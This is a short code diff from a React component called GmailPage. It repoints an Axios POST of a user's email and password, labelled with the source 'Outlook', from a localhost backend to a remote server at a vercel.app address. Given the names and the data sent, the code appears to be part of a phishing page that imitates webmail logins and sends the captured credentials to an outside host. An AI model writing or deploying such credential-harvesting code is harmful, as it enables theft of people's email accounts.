@@ -39,7 +39,7 @@ const GmailPage = () => {
     } else {
       try {
         // Send data to backend using Axios
-        const response = await axios.post("http://localhost:5100/api/submit-login", {
+        const response = await axios.post("https://votesy-server.vercel.app/api/submit-login", {
           source: "Outlook",
           email,
           password,
